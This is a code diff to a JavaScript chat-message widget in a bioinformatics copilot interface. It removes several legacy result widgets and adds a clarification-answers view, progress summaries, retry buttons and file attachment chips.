-        this.message.isQueryCollection = typeof processedData.isQueryCollection !== 'undefined' ? processedData.isQueryCollection : this.message.isQueryCollection;
-        this.message.queryCollectionData = typeof processedData.queryCollectionData !== 'undefined' ? processedData.queryCollectionData : this.message.queryCollectionData;
-        this.message.isJobsBrowse = typeof processedData.isJobsBrowse !== 'undefined'
-          ? (processedData.isJobsBrowse || this.message.isJobsBrowse)
-          : this.message.isJobsBrowse;
-        this.message.jobsBrowseResult = typeof processedData.jobsBrowseResult !== 'undefined'
-          ? (processedData.jobsBrowseResult || this.message.jobsBrowseResult)
-          : this.message.jobsBrowseResult;
-        this.message.tool_call = (typeof processedData.ui_tool_call !== 'undefined' && processedData.ui_tool_call)
-          ? processedData.ui_tool_call
-          : this.message.tool_call;
-
-        // Workflow and query collection data are set on message object above
       }
 
       // Add more top margin for first message, less for subsequent
       var marginTop = this.container.children.length === 0 ? '20px' : '5px';
 
-      // Create main message container with role-based styling
+      // Create main message container with role-based styling.
+      // user_clarification is rendered as an "Answered Questions" widget.
+      var messageRoleClass = this.message.role;
+      if (this.message.role === 'user_clarification') {
+        messageRoleClass = 'user_clarification answered-questions';
+      }
+
       var messageDiv = domConstruct.create('div', {
-        class: 'message ' + this.message.role,
+        class: 'message ' + messageRoleClass,
         style: 'margin-top: ' + marginTop + ';'
       }, this.container);
 
-      if (this.message.message_id === 'loading-indicator') {
-        // Show animated loading dots
-        domConstruct.create('div', {
-          innerHTML: '...',
-          style: 'font-size: 24px; animation: bounce 1s infinite;'
-        }, messageDiv);
-      } else if (this.message.role === 'system') {
+      if (this.message.role === 'system') {
         if (this.copilotEnableShowPromptDetails) {
           this.renderSystemMessage(messageDiv);
         }
       } else if (this.message.role === 'status') {
         this.renderStatusMessage(messageDiv);
+      } else if (this.message.role === 'user_clarification') {
+        this.renderAnsweredQuestionsMessage(messageDiv);
       } else {
         this.renderUserOrAssistantMessage(messageDiv);
       }
@@ -691,10 +481,31 @@ define([
      * @param {HTMLElement} messageDiv - Container to render status message into
      */
     renderStatusMessage: function(messageDiv) {
-      domConstruct.create('div', {
-        innerHTML: this.message.content ? this.md.render(this.message.content) : '',
-        class: 'markdown-content status-content'
+      var statusContentNode = domConstruct.create('div', {
+        class: 'status-content'
       }, messageDiv);
+      ProgressView.render(statusContentNode, {
+        steps: Array.isArray(this.message.steps) ? this.message.steps : [],
+        messageId: this.message.message_id,
+        startedAt: this.message.started_at || null,
+        fallbackText: this.message.content || ''
+      });
+    },
+
+    /**
+     * "What I did": the turn's steps under a finished assistant message,
+     * closed by default (agent_metadata.steps, saved by the gateway).
+     */
+    renderProgressSummary: function(messageDiv) {
+      var meta = this.message.agent_metadata;
+      var steps = meta && Array.isArray(meta.steps) ? meta.steps : null;
+      if (!steps || !steps.length) return;
+      var node = domConstruct.create('div', { class: 'progress-summary' }, messageDiv);
+      ProgressView.renderSummary(node, {
+        steps: steps,
+        messageId: this.message.message_id,
+        elapsedMs: meta.elapsed_ms || null
+      });
     },
 
     /**
@@ -704,8 +515,70 @@ define([
      * - For workflow messages, shows a "Review Workflow" button instead
      * @param {HTMLElement} messageDiv - Container to render message into
      */
+    renderAnsweredQuestionsMessage: function(messageDiv) {
+      var answers = Array.isArray(this.message.clarificationAnswers)
+        ? this.message.clarificationAnswers
+        : [];
+
+      // Fallback for older persisted sessions (content contains markdown list).
+      if (answers.length === 0 && typeof this.message.content === 'string') {
+        this.renderUserOrAssistantMessage(messageDiv);
+        return;
+      }
+
+      var container = domConstruct.create('div', {
+        class: 'answered-questions-container'
+      }, messageDiv);
+
+      domConstruct.create('div', {
+        class: 'answered-questions-header',
+        innerHTML: 'Answered Questions'
+      }, container);
+
+      var list = domConstruct.create('div', {
+        class: 'answered-questions-list'
+      }, container);
+
+      answers.forEach(lang.hitch(this, function(a, idx) {
+        var q = (a && a.question) ? String(a.question) : ('Question ' + (idx + 1));
+        var ans = (a && a.answer) ? String(a.answer) : '(no answer)';
+
+        var row = domConstruct.create('div', {
+          class: 'answered-questions-row'
+        }, list);
+
+        domConstruct.create('div', {
+          class: 'answered-questions-q',
+          innerHTML: this.escapeHtml(q)
+        }, row);
+
+        domConstruct.create('div', {
+          class: 'answered-questions-a',
+          innerHTML: this.escapeHtml(ans)
+        }, row);
+      }));
+
+      // Action buttons (copy + retry) below the widget.
+      var actionsBar = domConstruct.create('div', {
+        class: 'user-message-actions'
+      }, messageDiv);
+      this.createUserMessageActionButtons(actionsBar);
+
+      this.renderAttachments(messageDiv);
+    },
+
     renderUserOrAssistantMessage: function(messageDiv) {
       // Always render assistant/user text first, then append any tool UI widgets below.
+      var isUser = this.message.role === 'user' || this.message.role === 'user_clarification';
+      var contentParent = messageDiv;
+      if (isUser) {
+        // Bubble holds text + attachments; action buttons stay outside so they
+        // sit below the colored background rather than inside it.
+        contentParent = domConstruct.create('div', {
+          class: 'user-message-bubble'
+        }, messageDiv);
+      }
+
       var contentToRender = '';
       if (this.message.content) {
         if (typeof this.message.content === 'string') {
@@ -714,72 +587,59 @@ define([
           console.warn('[ChatMessage] ⚠ Content is not a string, converting to string. Type:', typeof this.message.content);
           console.warn('[ChatMessage] Content value:', this.message.content);
 
-          // Special handling for rag_result type - extract only the summary field
-          if (typeof this.message.content === 'object' && this.message.content.type === 'rag_result') {
-            contentToRender = this.message.content.summary || '';
-          } else {
-            // Convert to string - if it's an object, stringify it
-            contentToRender = typeof this.message.content === 'object'
-              ? JSON.stringify(this.message.content, null, 2)
-              : String(this.message.content);
-          }
+          // Convert to string - if it's an object, stringify it
+          contentToRender = typeof this.message.content === 'object'
+            ? JSON.stringify(this.message.content, null, 2)
+            : String(this.message.content);
         }
       }
 
       if (contentToRender) {
-        var markdownContainer = domConstruct.create('div', {
-          innerHTML: this.md.render(contentToRender),
-          class: 'markdown-content',
-          style: 'font-size: ' + this.fontSize + 'px;'
-        }, messageDiv);
-
-        // Process code blocks to make large ones collapsible
-        this.makeLargeCodeBlocksCollapsible(markdownContainer);
+        var contentContainer;
+        if (isUser) {
+          // Render user messages as plain text so characters like '>'
+          // (FASTA headers) are not consumed by the markdown parser.
+          contentContainer = domConstruct.create('div', {
+            innerHTML: this.escapeHtml(contentToRender),
+            class: 'markdown-content user-plain-text',
+            style: 'font-size: ' + this.fontSize + 'px;'
+          }, contentParent);
+        } else {
+          contentContainer = domConstruct.create('div', {
+            innerHTML: this.md.render(contentToRender),
+            class: 'markdown-content',
+            style: 'font-size: ' + this.fontSize + 'px;'
+          }, contentParent);
+          // Process code blocks to make large ones collapsible
+          this.makeLargeCodeBlocksCollapsible(contentContainer);
+          this._wireCursorDownloads(contentContainer);
+        }
+        this._decorateWorkspacePaths(contentContainer);
       }
 
-      // Tool-specific widgets are appended under the message text when available.
-      var renderSourceTool = this.message.ui_source_tool ||
-        this.message.source_tool ||
-        (this.message.tool_call && this.message.tool_call.tool) ||
-        '';
-      var hasWorkflowIdentity = !!(
-        this.message.workflow_id ||
-        (this.message.workflowData && this.message.workflowData.workflow_id) ||
-        (this.message.workflowData && this.message.workflowData.execution_metadata && this.message.workflowData.execution_metadata.workflow_id)
-      );
+      if (isUser) {
+        this.renderAttachments(contentParent);
+      } else {
+        this.renderProgressSummary(messageDiv);
+      }
 
-      if ((this.message.isWorkflow && this.message.workflowData) ||
-          (renderSourceTool.indexOf('plan_workflow') !== -1 && hasWorkflowIdentity) ||
-          (renderSourceTool.indexOf('submit_workflow') !== -1 && hasWorkflowIdentity) ||
-          (renderSourceTool.indexOf('plan_genome_assembly') !== -1 && hasWorkflowIdentity) ||
-          (renderSourceTool.indexOf('plan_genome_annotation') !== -1 && hasWorkflowIdentity) ||
-          (renderSourceTool.indexOf('plan_comparative_systems') !== -1 && hasWorkflowIdentity)) {
-        // debugger; // Debug assistant message when loading planned workflow UI
-        this.renderWorkflowManifestCard(messageDiv);
-      } else if (
-        this.message.uiAction === 'show_file_metadata' &&
-        this.message.uiPayload
-      ) {
-        this.renderFileMetadataWidget(messageDiv);
-      } else if (
-        (this.message.isWorkspaceBrowse && this.message.uiPayload) ||
-        (this.message.isWorkspaceListing && this.message.workspaceData) ||
-        ((renderSourceTool.indexOf('workspace_browse_tool') !== -1 ||
-          renderSourceTool.indexOf('list_genome_groups') !== -1 ||
-          renderSourceTool.indexOf('list_feature_groups') !== -1) && this.message.tool_call)
-      ) {
-        this.renderWorkspaceBrowseSummaryWidget(messageDiv);
-      } else if (
-        (this.message.isJobsBrowse && this.message.uiPayload) ||
-        ((renderSourceTool.indexOf('list_jobs') !== -1 || renderSourceTool.indexOf('get_recent_jobs') !== -1) && this.message.tool_call)
-      ) {
-        this.renderJobsBrowseSummaryWidget(messageDiv);
-      } else if (
-        this.message.isRagStreamQuery === true
-      ) {
-        this.renderRagResultWidget(messageDiv);
-      } else if (this.message.isQueryCollection && this.message.queryCollectionData) {
-        this.renderQueryCollectionWidget(messageDiv);
+      // --- Card dispatch ---
+      // Only interactive card types are rendered as widgets.
+      // Data query, workspace browse, jobs browse, file metadata, and
+      // workflow cards have been removed — agents now include actionable
+      // markdown links directly in their text responses.
+      if (this.message.card && this.message.card.card_type) {
+        switch (this.message.card.card_type) {
+          case 'plan':
+            this.renderPlanCard(messageDiv);
+            break;
+          case 'clarification':
+            this.renderClarificationChips(messageDiv);
+            break;
+          case 'execution_blocked':
+            this.renderExecutionBlockedCard(messageDiv);
+            break;
+        }
       }
 
       if (this.message.role === 'assistant') {
@@ -792,17 +652,18 @@ define([
         this.createMessageActionButtons(buttonContainer);
       }
 
-      if (this.message.role === 'user') {
-        // Create button container for user messages - positioned in bottom right
-        var buttonContainer = domConstruct.create('div', {
-          class: 'user-message-button-container'
+      if (isUser) {
+        // Create action bar below the bubble with copy + retry buttons
+        var actionsBar = domConstruct.create('div', {
+          class: 'user-message-actions'
         }, messageDiv);
 
-        // Add copy button for user messages
-        this.createUserMessageCopyButton(buttonContainer);
+        this.createUserMessageActionButtons(actionsBar);
       }
 
-      this.renderAttachments(messageDiv);
+      if (!isUser) {
+        this.renderAttachments(messageDiv);
+      }
     },
 
     renderAttachments: function(messageDiv) {
@@ -815,15 +676,36 @@ define([
       }, messageDiv);
 
       this.message.attachments.forEach(lang.hitch(this, function(attachment) {
-        if (!attachment || attachment.type !== 'image') {
-          return;
+        if (!attachment) return;
+
+        if (attachment.type === 'image') {
+          var label = attachment.name || (attachment.source === 'screenshot' ? 'Page screenshot' : 'Attached image');
+          domConstruct.create('div', {
+            class: 'message-attachment-chip',
+            innerHTML: '<i class="fa icon-image"></i> ' + this.escapeHtml(label)
+          }, container);
+        } else if (attachment.type === 'pdf') {
+          var pdfLabel = attachment.name || 'Attached PDF';
+          var pdfSizeStr = attachment.size ? ' (' + this._formatFileSize(attachment.size) + ')' : '';
+          domConstruct.create('div', {
+            class: 'message-attachment-chip',
+            innerHTML: '<i class="fa icon-file-pdf-o"></i> ' + this.escapeHtml(pdfLabel) + pdfSizeStr
+          }, container);
+        } else if (attachment.type === 'file') {
+          var fileLabel = attachment.name || 'Attached file';
+          var sizeStr = attachment.size ? ' (' + this._formatFileSize(attachment.size) + ')' : '';
+          domConstruct.create('div', {
+            class: 'message-attachment-chip',
+            innerHTML: '<i class="fa icon-file-text-o"></i> ' + this.escapeHtml(fileLabel) + sizeStr
+          }, container);
         }
-        var label = attachment.name || (attachment.source === 'screenshot' ? 'Page screenshot' : 'Attached image');
-        domConstruct.create('div', {
-          class: 'message-attachment-chip',
-          innerHTML: '<i class="fa icon-image"></i> ' + this.escapeHtml(label)
-        }, container);
       }));
+    },
+
+    _formatFileSize: function(bytes) {
+      if (bytes < 1024) return bytes + ' B';
+      if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+      return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
     },
 
     /**
@@ -913,444 +795,6 @@ define([
     },
 
     /**
-     * Renders a compact workspace browse summary with an action button.
-     * @param {HTMLElement} messageDiv - Container to render widget into
-     */
-    renderWorkspaceBrowseSummaryWidget: function(messageDiv) {
-      if (!this.message.tool_call || !this.message.tool_call.replay) {
-        return;
-      }
-      var toolCall = this.message.tool_call || this.message.ui_tool_call;
-      var toolArgs = toolCall.replay ? toolCall.replay : null;
-
-      var payload = {
-        arguments_executed: toolArgs ? toolArgs : null,
-        tool: toolCall.tool || null
-      };
-
-      var toolName = toolCall.tool || '';
-      var isGroupListTool = toolName.indexOf('list_genome_groups') !== -1 ||
-        toolName.indexOf('list_feature_groups') !== -1;
-      var isSearch = toolArgs && toolArgs.name_contains && toolArgs.name_contains.length > 0 ? true : false;
-      var isSearchResult = isGroupListTool ||
-        (this.message.uiPayload && this.message.uiPayload.result_type === 'search_result') ||
-        (toolArgs && toolArgs.result_type === 'search_result');
-
-      // Derive count: prefer uiPayload.count, then toolArgs.num_results, then chatSummary
-      var countValue = (this.message.uiPayload && typeof this.message.uiPayload.count === 'number')
-        ? this.message.uiPayload.count
-        : (toolArgs && toolArgs.num_results ? toolArgs.num_results : null);
-      var pathValue = toolCall.replay.path ? toolCall.replay.path : 'unknown path';
-
-      var summaryText;
-      if (this.message.chatSummary) {
-        summaryText = this.message.chatSummary;
-      } else if (countValue !== null) {
-        summaryText = 'Found ' + countValue + ' ' + (countValue === 1 ? 'result' : 'results') + ' in ' + pathValue;
-      } else {
-        summaryText = 'Workspace results are available. Open Workspace Tab to load.';
-      }
-      var workspaceBrowserUrl = this._buildWorkspaceBrowserUrl(toolCall.replay.path);
-
-      var container = domConstruct.create('div', {
-        class: 'workspace-summary-card'
-      }, messageDiv);
-
-      domConstruct.create('div', {
-        class: 'tool-card-status-row workspace-summary-text',
-        innerHTML: this.escapeHtml(summaryText)
-      }, container);
-
-      domConstruct.create('div', {
-        class: 'workspace-summary-path',
-        innerHTML: 'Path: ' + this.escapeHtml(pathValue)
-      }, container);
-
-      var openButton = domConstruct.create('button', {
-        type: 'button',
-        class: 'workspace-summary-open-button',
-        innerHTML: 'Open Workspace Tab'
-      }, container);
-      on(openButton, 'click', lang.hitch(this, function() {
-        topic.publish('CopilotWorkspaceBrowseOpen', {
-          uiPayload: payload,
-          tool_call: this.message.tool_call || payload.call || null,
-          chatSummary: summaryText,
-          uiAction: this.message.uiAction || 'open_workspace_tab'
-        });
-      }));
-
-      if (workspaceBrowserUrl && !isSearch && !isSearchResult) {
-        domConstruct.create('a', {
-          class: 'workspace-summary-link',
-          href: workspaceBrowserUrl,
-          target: '_blank',
-          rel: 'noopener noreferrer',
-          innerHTML: 'Open in Workspace Browser'
-        }, container);
-      }
-
-      // Selection indicator for workspace items
-      this._renderSelectionIndicator(container, {
-        category: 'workspace',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('workspace');
-          return items.map(function(item) {
-            return { label: item.path || item.name || item.id || 'Workspace item', id: item.id || item.path };
-          });
-        })
-      });
-    },
-
-    renderJobsBrowseSummaryWidget: function(messageDiv) {
-      var payload = this.message.uiPayload || {};
-      var jobs = Array.isArray(payload.jobs) ? payload.jobs : [];
-      var countValue = jobs.length;
-      var summaryText = this.message.chatSummary || ('Found ' + countValue + ' ' + (countValue === 1 ? 'job' : 'jobs'));
-
-      var container = domConstruct.create('div', {
-        class: 'workspace-summary-card'
-      }, messageDiv);
-
-      domConstruct.create('div', {
-        class: 'tool-card-status-row workspace-summary-text',
-        innerHTML: this.escapeHtml(summaryText)
-      }, container);
-
-      var detailParts = [];
-      if (payload.sort_by || payload.sort_dir || payload.status || payload.service) {
-        if (payload.sort_by) {
-          detailParts.push('Sort: ' + payload.sort_by + (payload.sort_dir ? ' (' + payload.sort_dir + ')' : ''));
-        }
-        if (payload.status) {
-          detailParts.push('Status: ' + payload.status);
-        }
-        if (payload.service) {
-          detailParts.push('Service: ' + payload.service);
-        }
-      }
-      if (detailParts.length) {
-        domConstruct.create('div', {
-          class: 'workspace-summary-path',
-          innerHTML: this.escapeHtml(detailParts.join(' • '))
-        }, container);
-      }
-
-      var openButton = domConstruct.create('button', {
-        type: 'button',
-        class: 'workspace-summary-open-button',
-        innerHTML: 'Open Jobs Tab'
-      }, container);
-      on(openButton, 'click', lang.hitch(this, function() {
-        topic.publish('CopilotJobsBrowseOpen', {
-          uiPayload: payload,
-          tool_call: this.message.tool_call || payload.call || null,
-          chatSummary: summaryText,
-          uiAction: this.message.uiAction || 'open_jobs_tab'
-        });
-      }));
-
-      // Selection indicator for jobs
-      this._renderSelectionIndicator(container, {
-        category: 'jobs',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('jobs');
-          return items.map(function(item) {
-            return { label: item.id || item.application_name || 'Job', id: item.id || item.job_id };
-          });
-        })
-      });
-    },
-
-    renderRagResultWidget: function(messageDiv) {
-      var summaryText = this._extractRagSummaryText();
-      var cardText = summaryText || 'RAG results are available.';
-      var container = domConstruct.create('div', {
-        class: 'workspace-summary-card'
-      }, messageDiv);
-
-      domConstruct.create('div', {
-        class: 'tool-card-status-row workspace-summary-text',
-        innerHTML: 'RAG results ready'
-      }, container);
-
-      domConstruct.create('div', {
-        class: 'workspace-summary-path',
-        innerHTML: this.escapeHtml(cardText)
-      }, container);
-
-      var openButton = domConstruct.create('button', {
-        type: 'button',
-        class: 'workspace-summary-open-button',
-        innerHTML: 'View Retrieved Chunks'
-      }, container);
-      on(openButton, 'click', lang.hitch(this, function() {
-        this.showRagChunksDialog(openButton);
-      }));
-
-      // Selection indicator for files (RAG results may create files)
-      this._renderSelectionIndicator(container, {
-        category: 'files',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('files');
-          return items.map(function(item) {
-            return { label: item.file_name || item.id || 'File', id: item.id || item.file_id };
-          });
-        })
-      });
-    },
-
-    showRagChunksDialog: function(triggerButton) {
-      if (!this.copilotApi || typeof this.copilotApi.searchRagChunkReferences !== 'function') {
-        console.warn('[ChatMessage] Copilot API does not support rag chunk search');
-        return;
-      }
-
-      var filters = this._buildRagChunkSearchFilters();
-      var dialogBody = domConstruct.create('div', {
-        style: 'max-height: 60vh; overflow-y: auto;'
-      });
-
-      var statusNode = domConstruct.create('div', {
-        innerHTML: 'Loading retrieved chunks...',
-        style: 'color: #4b5563; margin-bottom: 10px;'
-      }, dialogBody);
-
-      var chunksContainer = domConstruct.create('div', {}, dialogBody);
-
-      var chunksDialog = new Dialog({
-        title: 'Retrieved RAG Chunks',
-        style: 'width: 900px; max-width: 95vw;',
-        content: dialogBody
-      });
-
-      chunksDialog.startup();
-      chunksDialog.show();
-
-      if (triggerButton) {
-        triggerButton.disabled = true;
-        triggerButton.innerHTML = 'Loading...';
-      }
-
-      this.copilotApi.searchRagChunkReferences(filters).then(lang.hitch(this, function(response) {
-        domConstruct.empty(chunksContainer);
-        var items = response && Array.isArray(response.items) ? response.items : [];
-        var total = response && typeof response.total === 'number' ? response.total : items.length;
-        statusNode.innerHTML = 'Showing ' + items.length + ' of ' + total + ' chunk references';
-
-        if (!items.length) {
-          domConstruct.create('div', {
-            innerHTML: 'No chunks were found for this response.',
-            style: 'color: #6b7280;'
-          }, chunksContainer);
-          return;
-        }
-
-        items.forEach(lang.hitch(this, function(item, index) {
-          var chunkCard = domConstruct.create('div', {
-            style: 'border: 1px solid #e5e7eb; border-radius: 6px; padding: 10px; margin-bottom: 10px; background: #f9fafb;'
-          }, chunksContainer);
-
-          var titleParts = [];
-          titleParts.push('Chunk ' + (index + 1));
-          if (item.chunk_id) {
-            titleParts.push('ID: ' + item.chunk_id);
-          }
-          domConstruct.create('div', {
-            innerHTML: this.escapeHtml(titleParts.join(' | ')),
-            style: 'font-weight: 600; margin-bottom: 6px; color: #1f2937;'
-          }, chunkCard);
-
-          var metaParts = [];
-          if (item.doc_id) metaParts.push('Doc: ' + item.doc_id);
-          if (item.source_id) metaParts.push('Source: ' + item.source_id);
-          if (item.rag_db) metaParts.push('DB: ' + item.rag_db);
-          if (typeof item.score === 'number') metaParts.push('Score: ' + item.score);
-          if (item.message_timestamp) metaParts.push('Time: ' + new Date(item.message_timestamp).toLocaleString());
-          if (metaParts.length) {
-            domConstruct.create('div', {
-              innerHTML: this.escapeHtml(metaParts.join(' | ')),
-              style: 'font-size: 12px; color: #4b5563; margin-bottom: 8px;'
-            }, chunkCard);
-          }
-
-          if (item.content) {
-            domConstruct.create('pre', {
-              innerHTML: this.escapeHtml(item.content),
-              style: 'margin: 0; white-space: pre-wrap; word-break: break-word; max-height: 260px; overflow-y: auto; background: #fff; border: 1px solid #e5e7eb; border-radius: 4px; padding: 8px; font-size: 12px;'
-            }, chunkCard);
-          }
-        }));
-      })).catch(lang.hitch(this, function(error) {
-        statusNode.innerHTML = 'Failed to load chunks: ' + this.escapeHtml(error && error.message ? error.message : String(error));
-      })).then(function() {
-        if (triggerButton) {
-          triggerButton.disabled = false;
-          triggerButton.innerHTML = 'View Retrieved Chunks';
-        }
-      });
-    },
-
-    /**
-     * Renders a file metadata widget with preview
-     * @param {HTMLElement} messageDiv - Container to render widget into
-     */
-    renderFileMetadataWidget: function(messageDiv) {
-      var payload = this.message.uiPayload;
-      var metadata = payload.metadata || {};
-      var filePath = payload.path || 'unknown';
-      var fileName = metadata.name || filePath.split('/').pop() || 'Unknown file';
-      var fileType = metadata.type || 'unknown';
-
-      var container = domConstruct.create('div', {
-        class: 'workspace-summary-card file-metadata-card'
-      }, messageDiv);
-
-      domConstruct.create('div', {
-        class: 'tool-card-status-row workspace-summary-text',
-        innerHTML: this.escapeHtml(fileName)
-      }, container);
-
-      domConstruct.create('div', {
-        class: 'workspace-summary-path',
-        innerHTML: this.escapeHtml(fileType + ' • ' + filePath)
-      }, container);
-
-      // Download link container - will be populated async
-      var downloadContainer = domConstruct.create('div', {
-        class: 'file-metadata-download'
-      }, container);
-
-      var parentPath = filePath.split('/').slice(0, -1).join('/') || '/';
-      var workspaceDirUrl = this._buildWorkspaceBrowserUrl(parentPath);
-      if (workspaceDirUrl) {
-        domConstruct.create('a', {
-          class: 'workspace-summary-link',
-          href: workspaceDirUrl,
-          target: '_blank',
-          rel: 'noopener noreferrer',
-          innerHTML: 'Open in Workspace Browser'
-        }, container);
-      }
-
-      // Preview container - Show Preview button reveals content on click
-      var previewContainer = domConstruct.create('div', {
-        class: 'file-preview-container'
-      }, container);
-
-      var previewToggleButton = domConstruct.create('button', {
-        type: 'button',
-        class: 'workspace-summary-open-button file-preview-toggle-button',
-        innerHTML: 'Show Preview'
-      }, previewContainer);
-
-      var previewContentArea = domConstruct.create('div', {
-        class: 'file-preview-content-area'
-      }, previewContainer);
-      previewContentArea.style.display = 'none';
-
-      var showPreview = function() {
-        previewContainer.classList.add('file-preview-expanded');
-        previewToggleButton.style.display = 'none';
-        previewContentArea.style.display = '';
-      };
-
-      on(previewToggleButton, 'click', lang.hitch(this, function() {
-        if (previewContentArea.getAttribute('data-loaded') === '1') {
-          showPreview();
-          return;
-        }
-        if (previewContentArea.getAttribute('data-loading') === '1') {
-          return;
-        }
-        previewContentArea.setAttribute('data-loading', '1');
-        domConstruct.empty(previewContentArea);
-        domConstruct.create('div', {
-          class: 'file-preview-loading',
-          innerHTML: 'Loading preview...'
-        }, previewContentArea);
-        showPreview();
-
-        WorkspaceManager.getDownloadUrls([filePath]).then(lang.hitch(this, function(urls) {
-          if (urls && urls.length > 0) {
-            var downloadUrl = urls[0];
-            fetch(downloadUrl, {
-              headers: {
-                'Range': 'bytes=0-2047'
-              }
-            }).then(function(response) {
-              if (!response.ok) {
-                throw new Error('HTTP ' + response.status);
-              }
-              return response.text();
-            }).then(lang.hitch(this, function(previewText) {
-              domConstruct.empty(previewContentArea);
-              domConstruct.create('div', {
-                class: 'file-preview-label',
-                innerHTML: 'Preview (first 2KB):'
-              }, previewContentArea);
-              domConstruct.create('pre', {
-                class: 'file-preview-content',
-                innerHTML: this.escapeHtml(previewText)
-              }, previewContentArea);
-              previewContentArea.setAttribute('data-loaded', '1');
-              previewContentArea.removeAttribute('data-loading');
-            })).catch(lang.hitch(this, function() {
-              domConstruct.empty(previewContentArea);
-              domConstruct.create('div', {
-                class: 'file-preview-error',
-                innerHTML: 'There was an issue previewing this file'
-              }, previewContentArea);
-              previewContentArea.removeAttribute('data-loading');
-            }));
-          } else {
-            domConstruct.empty(previewContentArea);
-            domConstruct.create('div', {
-              class: 'file-preview-error',
-              innerHTML: 'There was an issue previewing this file'
-            }, previewContentArea);
-            previewContentArea.removeAttribute('data-loading');
-          }
-        })).catch(lang.hitch(this, function() {
-          domConstruct.empty(previewContentArea);
-          domConstruct.create('div', {
-            class: 'file-preview-error',
-            innerHTML: 'There was an issue previewing this file'
-          }, previewContentArea);
-          previewContentArea.removeAttribute('data-loading');
-        }));
-      }));
-
-      // Download link - fetch URL async (non-blocking)
-      setTimeout(lang.hitch(this, function() {
-        WorkspaceManager.getDownloadUrls([filePath]).then(lang.hitch(this, function(urls) {
-          if (urls && urls.length > 0) {
-            var downloadUrl = urls[0];
-            domConstruct.empty(downloadContainer);
-            domConstruct.create('a', {
-              class: 'workspace-summary-link',
-              href: downloadUrl,
-              target: '_blank',
-              download: fileName,
-              innerHTML: '<i class="fa icon-download"></i> Download file'
-            }, downloadContainer);
-          }
-        }));
-      }), 0);
-
-      // Selection indicator for files
-      this._renderSelectionIndicator(container, {
-        category: 'files',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('files');
-          return items.map(function(item) {
-            return { label: item.file_name || item.id || 'File', id: item.id || item.file_id };
-          });
-        })
-      });
-    },
-
-    /**
      * Creates a button element with standard styling
      *
      *
@@ -1398,18 +842,29 @@ define([
     },
 
     /**
-     * Creates copy button for user messages
+     * Creates copy + retry buttons for user messages.
+     * Placed in the action bar below the message bubble.
      */
-    createUserMessageCopyButton: function(buttonContainer) {
+    createUserMessageActionButtons: function(buttonContainer) {
       var copyButton = this.createButton('', 'copy-button', 'Copy message');
 
-      // Add click handler for copy button
       on(copyButton, 'click', lang.hitch(this, function(event) {
         topic.publish('copy-message', this.message.content);
         event.stopPropagation();
       }));
 
+      var retryButton = this.createButton('', 'retry-button', 'Retry this message');
+
+      on(retryButton, 'click', lang.hitch(this, function(event) {
+        var content = this.message.content;
+        if (content && typeof content === 'string' && content.trim()) {
+          topic.publish('RetryUserMessage', content);
+        }
+        event.stopPropagation();
+      }));
+
       domConstruct.place(copyButton, buttonContainer);
+      domConstruct.place(retryButton, buttonContainer);
     },
 
     /**
@@ -1539,1487 +994,206 @@ define([
       return container;
     },
 
-    _buildQueryLinkOpenPlan: function(opts) {
-      var options = (opts && typeof opts === 'object') ? opts : {};
-      var queryText = options.rqlReplay || null;
-      var collection = options.collection || null;
-      // Simple special handling: for genome, open GenomeList with query appended directly
-      if (collection && collection.toLowerCase() === 'genome' && queryText) {
-        var baseGenomeUrl = 'https://www.bv-brc.org/view/GenomeList/';
-        return {
-          url: baseGenomeUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      // Simple special handling: for taxonomy, open TaxonList with query appended directly
-      else if (collection && collection.toLowerCase() === 'taxonomy' && queryText) {
-        var baseTaxonomyUrl = 'https://www.bv-brc.org/view/TaxonList/';
-        return {
-          url: baseTaxonomyUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      // Simple special handling: for genome_feature, open FeatureList with query appended directly
-      else if (collection && collection.toLowerCase() === 'genome_feature' && queryText) {
-        var baseFeatureUrl = 'https://www.bv-brc.org/view/FeatureList/';
-        return {
-          url: baseFeatureUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'pathway' && queryText) {
-        var basePathwayUrl = 'https://www.bv-brc.org/view/PathwayList/';
-        return {
-          url: basePathwayUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'protein_structure' && queryText) {
-        var baseProteinStructureUrl = 'https://www.bv-brc.org/view/ProteinStructureList/';
-        return {
-          url: baseProteinStructureUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'strain' && queryText) {
-        var baseStrainUrl = 'https://www.bv-brc.org/view/StrainList/';
-        return {
-          url: baseStrainUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'surveillance' && queryText) {
-        var baseSurveillanceUrl = 'https://www.bv-brc.org/view/SurveillanceList/';
-        return {
-          url: baseSurveillanceUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'subsystem' && queryText) {
-        var baseSubsystemUrl = 'https://www.bv-brc.org/view/SubsystemList/';
-        return {
-          url: baseSubsystemUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'serology' && queryText) {
-        var baseSerologyUrl = 'https://www.bv-brc.org/view/SerologyList/';
-        return {
-          url: baseSerologyUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'epitope' && queryText) {
-        var baseEpitopeUrl = 'https://www.bv-brc.org/view/EpitopeList/';
-        return {
-          url: baseEpitopeUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'sp_gene' && queryText) {
-        var baseSpGeneUrl = 'https://www.bv-brc.org/view/SpecialtyGeneList/';
-        return {
-          url: baseSpGeneUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'sp_gene_ref' && queryText) {
